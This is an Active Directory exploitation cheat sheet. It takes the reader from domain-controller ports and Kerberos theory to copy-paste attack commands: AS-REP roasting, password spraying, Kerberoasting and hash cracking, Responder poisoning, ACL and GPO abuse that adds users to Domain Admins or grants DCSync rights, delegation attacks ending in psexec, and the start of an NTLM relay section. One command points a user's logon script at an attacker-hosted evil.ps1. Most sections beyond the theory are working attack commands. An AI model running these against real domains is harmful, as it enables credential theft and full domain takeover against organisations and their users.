# Active Directory Exploitation

## ðŸŽ¯ Goal

Escalate from a single foothold in an AD environment to **domain dominance** using Kerberos/NTLM abuses, misconfigurations, and attack paths.

---

## Table of Contents

1. [AD Theory & Fundamentals](#1-ad-theory--fundamentals)
2. [Pre-Authentication Phase (No Credentials)](#2-pre-authentication-phase-no-credentials)
3. [Initial Access Phase (Valid User Credentials)](#3-initial-access-phase-valid-user-credentials)
4. [Privilege Escalation Phase (Elevated Rights Required)](#4-privilege-escalation-phase-elevated-rights-required)
5. [Domain Dominance Phase (High-Privilege Access)](#5-domain-dominance-phase-high-privilege-access)
6. [Persistence & Evasion](#6-persistence--evasion)

---

## ðŸ“‹ Attack Path Checklist

### Pre-Authentication (No Credentials)
- [ ] AS-REP Roasting â†’ [2.1](#21-as-rep-roasting)
- [ ] Password Spraying â†’ [2.2](#22-password-spraying)

### Initial Access (Valid User)
- [ ] Kerberoasting â†’ [3.1](#31-kerberoasting)
- [ ] Enumerate Domain â†’ [3.2](#32-domain-enumeration)
- [ ] LLMNR/NBT-NS Poisoning â†’ [3.3](#33-llmnrnbt-ns-poisoning)

### Privilege Escalation (Medium Privileges)
- [ ] ACL Abuse â†’ [4.1](#41-acl-based-attacks)
- [ ] Delegation Abuse â†’ [4.2](#42-delegation-abuse)
- [ ] NTLM Relay â†’ [4.3](#43-ntlm-relay-attacks)
- [ ] AD CS Exploitation â†’ [4.4](#44-ad-cs-certificate-services-abuse)

### Domain Dominance (High Privileges)
- [ ] DCSync â†’ [5.1](#51-dcsync)
- [ ] Pass-the-Hash â†’ [5.2](#52-pass-the-hash-pth)
- [ ] Pass-the-Ticket â†’ [5.3](#53-pass-the-ticket--overpass-the-hash)

### Persistence
- [ ] Golden Ticket â†’ [6.1](#61-golden-ticket)
- [ ] Silver Ticket â†’ [6.2](#62-silver-ticket)
- [ ] Shadow Credentials â†’ [6.3](#63-shadow-credentials)

---

## 1 AD Theory & Fundamentals

### 1.1 Active Directory Architecture

**Active Directory (AD)** is a database and set of services that connect users with the network resources they need to get their work done.

* **Protocol**: Relies heavily on **LDAP** (Lightweight Directory Access Protocol) for querying objects and **DNS** for locating services (Domain Controllers).
* **Schema**: Defines the attributes (e.g., `sAMAccountName`, `memberOf`) that objects can have.
* **Trusts**: Relationships that allow users in one domain to access resources in another.
  * *Parent-Child*: Automatic, two-way, transitive.
  * *Forest Trust*: Manually created between forests.

A **Domain Controller (DC)** is the server that holds the authoritative directory service database for a domain.

### 1.2 Key Terminology

#### Structure & Objects
- **Forest**: The highest level of logical container in AD, sharing a common schema and global catalog.
- **Domain**: A logical group of network objects (computers, users, devices) that share the same AD database.
- **OU (Organizational Unit)**: Containers within a domain used to organize objects and apply Group Policies (GPOs).
- **SID (Security Identifier)**: A unique ID for an object (e.g., `S-1-5-21...`).
- **RID (Relative Identifier)**: The last part of a SID that identifies the specific object within the domain (e.g., `500` for Administrator).
- **ACL/ACE**: Access Control List / Access Control Entry. Defines who can do what to an object.
- **Global Catalog**: A distributed data storage that contains a searchable, partial representation of every object in every domain in a multi-domain Active Directory forest.

#### Authentication & Protocols
- **KDC (Key Distribution Center)**: The service on a DC that issues Kerberos tickets (consists of AS and TGS).
- **TGT (Ticket Granting Ticket)**: Proof of identity. "I am who I say I am." Used to request service tickets.
- **TGS (Ticket Granting Service)**: A ticket for a specific service (e.g., SQL, CIFS). "I am allowed to access this specific resource."
- **SPN (Service Principal Name)**: A unique identifier for a service running on a host. Essential for Kerberos.
- **PAC (Privilege Attribute Certificate)**: An extension in Kerberos tickets containing the user's SIDs and group memberships.
- **NTLM**: Legacy challenge-response authentication. Vulnerable to Relay and Pass-the-Hash.

### 1.3 Domain Controller Ports

| Port | Protocol | Service | Purpose |
|------|----------|---------|---------|
| `53` | TCP/UDP | DNS | Domain Name Resolution |
| `88` | TCP/UDP | Kerberos | Authentication |
| `135` | TCP | RPC Endpoint Mapper | Remote Procedure Calls |
| `137` | UDP | NetBIOS Name Service | NetBIOS Name Resolution |
| `138` | UDP | NetBIOS Datagram | NetBIOS Datagram Service |
| `139` | TCP | NetBIOS Session | SMB over NetBIOS |
| `389` | TCP/UDP | LDAP | Directory queries |
| `445` | TCP | SMB/CIFS | File sharing, named pipes |
| `464` | TCP/UDP | Kerberos Password | Password changes |
| `636` | TCP | LDAPS | Secure LDAP (SSL/TLS) |
| `3268` | TCP | Global Catalog | Cross-domain queries |
| `3269` | TCP | Global Catalog SSL | Secure cross-domain queries |
| `5985` | TCP | WinRM HTTP | Windows Remote Management |
| `5986` | TCP | WinRM HTTPS | Secure Windows Remote Management |
| `9389` | TCP | AD Web Services | PowerShell AD Module |
| `49152-65535` | TCP | Dynamic RPC | Various AD operations |

### 1.4 Authentication Protocols

#### NTLM (New Technology LAN Manager)
A legacy challenge-response protocol. It does **not** verify the server's identity to the client, making it vulnerable to Relay attacks.

1. **Negotiation**: Client tells Server it wants to authenticate.
2. **Challenge**: Server sends a random 16-byte nonce (Challenge).
3. **Response**: Client encrypts the challenge using their NTLM hash and sends it back.
4. **Verification**: Server checks if the math works (or forwards it to the DC to check).

> **Exploitation Context**: Since the server sends the challenge, an attacker can position themselves in the middle, receive the client's auth request, and relay it to a different target (SMB Relay).

#### Kerberos
Kerberos is the default, ticket-based authentication protocol used in Windows environments. Its defining feature is **mutual authentication**: the client proves its identity to the server, and the server proves its identity to the client.

**1. TGT (Ticket Granting Ticket)**
* **Analogy:** A valid Passport or ID Card.
* **Function:** Proves your identity to the Key Distribution Center (KDC). You obtain this once by successfully entering your password. You then present this to the KDC whenever you need to request access to specific resources later.
* **Signer:** Encrypted and signed with the **`krbtgt` account password hash**.
    * *Note:* Only the KDC can create valid TGTs because only the KDC knows the `krbtgt` hash.

**2. TGS (Ticket Granting Service) / Service Ticket**
* **Analogy:** A Movie Ticket or Gym Pass.
* **Function:** Grants access to a single, specific service (e.g., a File Share, SQL Server, or HTTP service). You obtain this by showing your TGT to the KDC and asking for entry to a specific "venue."
* **Signer:** Encrypted and signed with the **Target Service Account's password hash**.
    * *Note:* The target service can decrypt this ticket to verify your identity without needing to contact the Domain Controller.

**The Authentication Flow**

1. **AS-REQ (Authentication Service Request):**
   * The user wants to log in. They encrypt a timestamp with their **own password hash** and send it to the KDC.
2. **AS-REP (Authentication Service Reply):**
   * The KDC validates the user's hash. If correct, it issues a **TGT**.
   * *Key detail:* This TGT is encrypted with the `krbtgt` hash. The user cannot read it; they simply store it in memory.
3. **TGS-REQ (Ticket Granting Service Request):**
   * The user wants to access a specific resource (e.g., a File Share). They send their **TGT** + the **SPN (Service Principal Name)** of the resource to the KDC.
4. **TGS-REP (Ticket Granting Service Reply):**
   * The KDC validates the TGT. It generates a **Service Ticket** for that specific resource.
   * *Key detail:* This ticket is encrypted with the **Service Account's hash**.
5. **AP-REQ (Application Request):**
   * The user presents the Service Ticket directly to the Server (e.g., File Server) to gain access.

> **Exploitation Context**:
> * **Golden Ticket**: If you have the `krbtgt` hash, you can forge the TGT (Step 2).
> * **Silver Ticket**: If you have the Service hash, you can forge the Service Ticket (Step 4).
> * **Kerberoasting**: Any user can request a Service Ticket (Step 3). The returned ticket (Step 4) is encrypted with the service owner's hash. You can crack this offline.

### 1.5 Cached Credentials & Storage

Where do credentials live on a Windows machine?

| Storage Type | Process/Location | Description | Attack Vector |
|:---|:---|:---|:---|
| **LSASS Memory** | `lsass.exe` | Stores active credentials (Cleartext, NTLM, Kerberos Tickets) for Single Sign-On. | Mimikatz `sekurlsa::logonpasswords` |
| **SAM Database** | `%SystemRoot%\system32\config\SAM` | Stores local user NTLM hashes. | `sekurlsa::sam` or Copy/Volume Shadow Copy |
| **LSA Secrets** | Registry | Stores service account passwords, scheduled task creds. | `lsadump::secrets` |
| **DCC2 (mscache)** | Registry (Security Hive) | "Domain Cached Credentials." Used to login when DC is offline. PBKDF2 (salted), very slow to crack. | `lsadump::cache` |
| **NTDS.dit** | `%SystemRoot%\NTDS\ntds.dit` | **Domain Controller Only**. The database of *every* AD user's hash. | DCSync or VSS Shadow Copy |

---

## 2 Pre-Authentication Phase (No Credentials)

### 2.1 AS-REP Roasting

**Prerequisites:** None (only requires valid username list)

**Concept:** If an account has "Do not require Kerberos pre-authentication" enabled, you can request an AS-REP response for that account without knowing the password. This response contains data encrypted with the user's password hash, which can be cracked offline.

#### Find Vulnerable Accounts (If you have credentials)

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname

# AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

#### Request AS-REP Hashes - Linux

```bash
# Without credentials (enumerate from user list)
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.hashes

# For specific user (no creds needed)
impacket-GetNPUsers <DOMAIN>/<TARGET_DOMAIN_USER> -no-pass -dc-ip <DC_IP>

# With credentials (to find vulnerable accounts first)
impacket-GetNPUsers <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD> -dc-ip <DC_IP> -request
```

#### Request AS-REP Hashes - Windows

```powershell
# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
.\Rubeus.exe asreproast /user:<DOMAIN_USER> /format:hashcat
```

#### Crack AS-REP Hashes

```bash
# Hashcat (mode 18200 for AS-REP)
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john --format=krb5asrep asrep.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

### 2.2 Password Spraying

**Prerequisites:** None (only requires valid username list)

**Concept:** Try a single common password against many user accounts. This avoids account lockout since you're not repeatedly trying passwords against a single account.

#### Get Password Policy (If accessible)

```bash
# NetExec
netexec smb <DC_IP> -u '' -p '' --pass-pol

# enum4linux
enum4linux -P <DC_IP>
```

#### Password Spraying - Linux

```bash
# Kerbrute (recommended for stealth)
./kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<DOMAIN_USER_PWD>'

# With delay (avoid detection)
./kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<DOMAIN_USER_PWD>' --delay 100

# NetExec/CrackMapExec - SMB
netexec smb <DC_IP> -u users.txt -p '<DOMAIN_USER_PWD>' --continue-on-success
crackmapexec smb <DC_IP> -u users.txt -p '<DOMAIN_USER_PWD>' --continue-on-success

# NetExec - WinRM
netexec winrm <DC_IP> -u users.txt -p '<DOMAIN_USER_PWD>' --continue-on-success

# Multiple passwords
crackmapexec smb <DC_IP> -u users.txt -p passwords.txt --continue-on-success
```

#### Password Spraying - Windows

```powershell
# DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Summer2021!'
Invoke-DomainPasswordSpray -UserList users.txt -PasswordList passwords.txt -Domain <DOMAIN>

# Rubeus brute
.\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:<DOMAIN>
```

---

## 3 Initial Access Phase (Valid User Credentials)

### 3.1 Kerberoasting

**Prerequisites:** Valid domain user credentials

**Concept:** Any domain user can request a TGS (service ticket) for services that have SPNs registered. The TGS is encrypted with the service account's password hash. If the service runs under a user account (not a machine account), this hash can often be cracked offline.

#### Find Kerberoastable Accounts - Linux

```bash
# List users with SPNs
GetUserSPNs.py <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD> -dc-ip <DC_IP>

# Request TGS (Roast) and save to file
GetUserSPNs.py <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD> -dc-ip <DC_IP> -request -outputfile hashes.kerberoast

# With hash
GetUserSPNs.py <DOMAIN>/<DOMAIN_USER> -hashes :<NTLM_HASH> -dc-ip <DC_IP> -request

# NetExec
netexec ldap <DC_IP> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --kerberoasting hashes.kerberoast
```

#### Find Kerberoastable Accounts - Windows

```powershell
# PowerView
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# setspn (native)
setspn -T <DOMAIN> -Q */*
```

#### Request TGS Tickets - Windows

```powershell
# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:<DOMAIN_USER> /outfile:hashes.kerberoast

# Invoke-Kerberoast
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -Encoding ASCII hashes.kerberoast
```

#### Crack TGS Hashes

```bash
# Hashcat (mode 13100 for TGS-REP)
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john --format=krb5tgs hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
```

### 3.2 Domain Enumeration

**Prerequisites:** Valid domain user credentials

#### Basic Domain Information

```powershell
# PowerView
Get-Domain
Get-DomainController
Get-DomainPolicy
Get-DomainTrust

# AD Module
Get-ADDomain
Get-ADDomainController
Get-ADTrust -Filter *
```

```bash
# Linux - ldapsearch
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN_USER>@<DOMAIN>" -w '<DOMAIN_USER_PWD>' -b "dc=<DOMAIN>,dc=local" "(objectClass=*)"
```

#### User Enumeration

```powershell
# PowerView
Get-DomainUser
Get-DomainUser -Identity <TARGET_DOMAIN_USER> -Properties *
Get-DomainUser | select samaccountname,description

# AD Module
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity <TARGET_DOMAIN_USER> -Properties *
```

#### Group Enumeration

```powershell
# PowerView
Get-DomainGroup
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember
Get-DomainGroupMember -Identity "Domain Admins"

# AD Module
Get-ADGroup -Filter * -Properties *
Get-ADGroupMember -Identity "Domain Admins"
```

#### Computer Enumeration

```powershell
# PowerView
Get-DomainComputer
Get-DomainComputer -Properties dnshostname,operatingsystem

# AD Module
Get-ADComputer -Filter * -Properties *
```

### 3.3 LLMNR/NBT-NS Poisoning

**Prerequisites:** Network position for MITM, valid domain credentials (for relay)

**Concept:** When a Windows machine fails to resolve a hostname via DNS, it falls back to LLMNR and NBT-NS broadcasts. An attacker can respond to these broadcasts, poisoning the name resolution and capturing NTLM authentication attempts.

#### Capture Hashes with Responder

```bash
# Responder (capture hashes)
sudo responder -I eth0 -wrf
sudo responder -I eth0 -dwP

# Captured hashes will be saved to /usr/share/responder/logs/
```

#### Crack Captured Hashes

```bash
# Hashcat (mode 5600 for NTLMv2)
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

#### Windows - Inveigh

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -ConsoleOutput Y
```

---

## 4 Privilege Escalation Phase (Elevated Rights Required)

### 4.1 ACL-Based Attacks

**Prerequisites:** Write/modify permissions on AD objects (discovered via BloodHound or manual enumeration)

**Concept:** Active Directory uses Access Control Lists (ACLs) to define who can do what to each object. Misconfigurations in ACLs can allow privilege escalation by granting unintended permissions to low-privileged users.

#### Enumerate ACLs - Windows

```powershell
# PowerView - Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# ACLs on specific object
Get-ObjectAcl -SamAccountName <TARGET_USER> -ResolveGUIDs
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs

# Filter for specific rights
Get-ObjectAcl -Identity <TARGET> -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDacl|WriteOwner|Self"
}
```

#### Enumerate ACLs - Linux

```bash
# Using bloodyAD
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> get writable --detail

# Using dacledit (Impacket)
impacket-dacledit <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD> -dc-ip <DC_IP> -target '<TARGET_USER>' -action read
```

#### GenericAll on User

Full control over user object - can change password, set SPN, modify any attribute.

```powershell
# Change password
net user <TARGET_USER> NewPassword123! /domain

# Using PowerView
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)

# Targeted Kerberoasting (set SPN)
Set-DomainObject -Identity <TARGET_USER> -SET @{serviceprincipalname='nonexistent/YOURSPN'}
.\Rubeus.exe kerberoast /user:<TARGET_USER>
# Clear SPN after
Set-DomainObject -Identity <TARGET_USER> -Clear serviceprincipalname

# Targeted AS-REP Roasting (disable preauth)
Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304}
.\Rubeus.exe asreproast /user:<TARGET_USER>
# Re-enable preauth
Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304}
```

```bash
# Linux - bloodyAD
# Change password
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> set password <TARGET_USER> 'NewPassword123!'

# Set SPN for Kerberoasting
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> set object <TARGET_USER> servicePrincipalName -v 'fake/spn'
```

#### GenericAll on Group

Full control over group object - can add/remove members.

```powershell
# Add yourself to the group
net group "<TARGET_DOMAIN_GROUP>" <DOMAIN_USER> /add /domain

# Using PowerView
Add-DomainGroupMember -Identity "<TARGET_DOMAIN_GROUP>" -Members <DOMAIN_USER>

# AD Module
Add-ADGroupMember -Identity "<TARGET_DOMAIN_GROUP>" -Members <DOMAIN_USER>

# Verify
Get-DomainGroupMember -Identity "<TARGET_DOMAIN_GROUP>"
```

```bash
# Linux - bloodyAD
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> add groupMember "<TARGET_GROUP>" <DOMAIN_USER>
```

#### GenericAll on Computer

Full control over computer object - can configure RBCD, read LAPS password.

```powershell
# RBCD Attack (see Delegation section)
Set-ADComputer <TARGET_COMPUTER> -PrincipalsAllowedToDelegateToAccount <YOUR_MACHINE>$

# Read LAPS password (if LAPS installed)
Get-DomainComputer <TARGET_COMPUTER> -Properties ms-mcs-admpwd | select ms-mcs-admpwd

# AD Module
Get-ADComputer <TARGET_COMPUTER> -Properties ms-mcs-admpwd | select ms-mcs-admpwd
```

```bash
# Linux - Read LAPS password
netexec ldap <DC_IP> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> -M laps
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> get object <TARGET_COMPUTER>$ --attr ms-mcs-admpwd
```

#### GenericWrite

Can write to specific attributes - useful for setting SPN, delegation, or logon scripts.

```powershell
# Set SPN for Kerberoasting
Set-DomainObject -Identity <TARGET_USER> -SET @{serviceprincipalname='fake/spn'}

# Set script path (malicious logon script)
Set-DomainObject -Identity <TARGET_USER> -SET @{scriptpath='\\<LHOST>\share\evil.ps1'}
```

```bash
# Linux - bloodyAD
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> set object <TARGET> servicePrincipalName -v 'fake/spn'
```

#### WriteDacl

Can modify the ACL of the object - grant yourself more permissions.

```powershell
# Grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity <TARGET_DOMAIN_IDENTITY> -PrincipalIdentity "<DOMAIN>\<DOMAIN_USER>" -Rights All

# Grant DCSync rights on domain
Add-DomainObjectAcl -TargetIdentity "DC=<DOMAIN>,DC=local" -PrincipalIdentity "<DOMAIN>\<DOMAIN_USER>" -Rights DCSync
```

```bash
# Linux - bloodyAD
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> add genericAll 'OU=<TARGET_OU>,DC=<DOMAIN>,DC=local' <TARGET_DOMAIN_USER>

# Add DCSync rights
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> add dcsync <TARGET_DOMAIN_USER>

# Using dacledit
impacket-dacledit <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD> -dc-ip <DC_IP> -target '<TARGET>' -action write -rights FullControl -principal <TARGET_DOMAIN_USER>
```

#### WriteOwner

Can take ownership of the object - then modify ACL (WriteDacl).

```powershell
# Take ownership
Set-DomainObjectOwner -Identity <TARGET_DOMAIN_IDENTITY> -OwnerIdentity <DOMAIN_USER>

# Then grant yourself rights
Add-DomainObjectAcl -TargetIdentity <TARGET_DOMAIN_IDENTITY> -PrincipalIdentity <DOMAIN_USER> -Rights All
```

```bash
# Linux - bloodyAD
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> set owner <TARGET_IDENTITY> <TARGET_DOMAIN_USER>

# Then add rights
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> add genericAll <TARGET_IDENTITY> <TARGET_DOMAIN_USER>
```

#### ForceChangePassword

Can reset password without knowing current password.

```powershell
# PowerView
$NewPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $NewPassword

# Using net
net user <TARGET_USER> NewPassword123! /domain
```

```bash
# Linux - bloodyAD
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> set password <TARGET_DOMAIN_USER> 'NewPassword123!'

# Using rpcclient
rpcclient -U '<DOMAIN_USER>%<DOMAIN_USER_PWD>' <DC_IP> -c "setuserinfo2 <TARGET_DOMAIN_USER> 23 'NewPassword123!'"
```

#### AllExtendedRights

When you have AllExtendedRights on another user, you can reset their password without knowing the current one.

```powershell
# PowerView
$NewPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $NewPassword

# PowerShell AD Module
Set-ADAccountPassword -Identity <TARGET_USER> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force)
```

```bash
# Linux - bloodyAD
bloodyAD -d <DOMAIN> -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> --host <DC_IP> set password <TARGET_DOMAIN_USER> 'NewPassword123!'
```

#### GPO Permission Abuse

**Concept:** If you have write permissions on a GPO, you can modify it to push malicious configurations to all computers where that GPO is linked.

```bash
# Linux - pyGPOAbuse
python3 pygpoabuse.py <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD> \
  -gpo-id <GPO_GUID> \
  -dc-ip <DC_IP> \
  -powershell \
  -taskname "SecurityUpdate" \
  -description "Important security maintenance" \
  -command "net group 'Domain Admins' <DOMAIN_USER> /add /domain"
```

```powershell
# Windows - SharpGPOAbuse
# Add a local admin via Immediate Task
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <DOMAIN_USER> --GPOName "<GPO_DISPLAY_NAME>"

# Execute custom command
.\SharpGPOAbuse.exe --TaskName "Maintenance" --GPOName "<GPO_DISPLAY_NAME>" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net group 'Domain Admins' <DOMAIN_USER> /add /domain" --Trigger "Immediate"
```

### 4.2 Delegation Abuse

**Prerequisites:** 
- **Unconstrained Delegation**: Compromise a server with unconstrained delegation enabled
- **Constrained Delegation**: Compromise a service account with constrained delegation rights
- **RBCD**: Write privileges on target computer object (GenericAll, GenericWrite, WriteDacl, WriteOwner)

**Concept:** Kerberos delegation allows a service to impersonate users to access other services on their behalf. Misconfigurations in delegation settings can be abused for privilege escalation.

#### Find Delegation - Windows

```powershell
# PowerView - Unconstrained Delegation (computers)
Get-DomainComputer -Unconstrained | select dnshostname,useraccountcontrol

# PowerView - Unconstrained Delegation (users - rare)
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# PowerView - Constrained Delegation
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select dnshostname,msds-allowedtodelegateto

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
```

#### Find Delegation - Linux

```bash
# NetExec
netexec ldap <DC_IP> -u '<DOMAIN_USER>' -p '<DOMAIN_USER_PWD>' --trusted-for-delegation

# Impacket findDelegation
impacket-findDelegation <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD> -dc-ip <DC_IP>
```

#### Unconstrained Delegation Attack

```powershell
# On compromised server with unconstrained delegation
# Step 1: Monitor for incoming TGTs
.\Rubeus.exe monitor /interval:5 /nowrap /targetuser:Administrator

# Step 2: Coerce authentication from a high-value target (e.g., DC)
# From another machine - PrinterBug
.\SpoolSample.exe <DC_FQDN> <COMPROMISED_SERVER_FQDN>

# Step 3: Extract and use the captured TGT
.\Rubeus.exe dump /nowrap
.\Rubeus.exe ptt /ticket:<BASE64_TGT>

# Step 4: DCSync with the DC's TGT
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
```

#### Constrained Delegation Attack - Windows

```powershell
# S4U attack - impersonate user to allowed service
# Using Rubeus
.\Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:<ALLOWED_SPN> /ptt

# Example: websvc can delegate to cifs/fileserver
.\Rubeus.exe s4u /user:websvc /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /ptt

# Alternative SPN (abuse service name flexibility)
.\Rubeus.exe s4u /user:websvc /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /altservice:ldap /ptt
```

#### Constrained Delegation Attack - Linux

```bash
# Impacket getST - get service ticket as impersonated user
impacket-getST -spn <ALLOWED_SPN> -impersonate Administrator <DOMAIN>/<SERVICE_ACCOUNT>:<DOMAIN_USER_PWD> -dc-ip <DC_IP>

# With hash
impacket-getST -spn cifs/fileserver.domain.local -impersonate Administrator <DOMAIN>/<SERVICE_ACCOUNT> -hashes :<NTLM_HASH> -dc-ip <DC_IP>

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@fileserver.domain.local -k -no-pass
```

#### Resource-Based Constrained Delegation (RBCD) Attack

```powershell
# Requirements: GenericAll/GenericWrite/WriteDacl on target computer object

# Step 1: Create a machine account (if MAQ > 0)
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount YOURCOMPUTER -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Step 2: Set RBCD on target (allow our machine to delegate to target)
$ComputerSid = Get-DomainComputer YOURCOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <TARGET_COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Or using AD Module
Set-ADComputer <TARGET_COMPUTER> -PrincipalsAllowedToDelegateToAccount YOURCOMPUTER$

# Step 3: Calculate hash of machine account password
.\Rubeus.exe hash /password:Password123!

# Step 4: S4U attack
.\Rubeus.exe s4u /user:YOURCOMPUTER$ /rc4:<MACHINE_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_COMPUTER> /ptt
```

#### RBCD Attack - Linux

```bash
# Step 1: Add machine account
impacket-addcomputer <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD> -computer-name 'YOURCOMPUTER$' -computer-pass 'Password123!' -dc-ip <DC_IP>

# Step 2: Configure RBCD on target
impacket-rbcd <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD> -delegate-from 'YOURCOMPUTER$' -delegate-to '<TARGET_COMPUTER>$' -action write -dc-ip <DC_IP>

# Step 3: Get service ticket
impacket-getST -spn cifs/<TARGET_COMPUTER>.<DOMAIN> -impersonate Administrator <DOMAIN>/'YOURCOMPUTER$':'Password123!' -dc-ip <DC_IP>

# Step 4: Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<TARGET_COMPUTER>.<DOMAIN> -k -no-pass

# Cleanup - remove RBCD configuration
impacket-rbcd <DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD> -delegate-to '<TARGET_COMPUTER>$' -action flush -dc-ip <DC_IP>
```

### 4.3 NTLM Relay Attacks

**Prerequisites:**
- Network position for MITM
- SMB signing disabled on targets (for SMB relay)
- LDAP signing not enforced (for LDAP relay)

**Concept:** NTLM authentication can be relayed from one service to another because the server doesn't verify the origin of the authentication request. An attacker can capture NTLM authentication and relay it to a target service to gain unauthorized access.

#### Check SMB Signing

```bash
# Generate list of relay targets (signing disabled)
netexec smb <IP_RANGE> --gen-relay-list targets.txt
crackmapexec smb <IP_RANGE> --gen-relay-list targets.txt

# Check specific host
netexec smb <RHOST>
# Look for "signing:False"
```

#### NTLM Relay to SMB

```bash
# Setup relay (disable SMB/HTTP in Responder first)
# Edit /etc/responder/Responder.conf: Set SMB=Off and HTTP=Off
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay with command execution
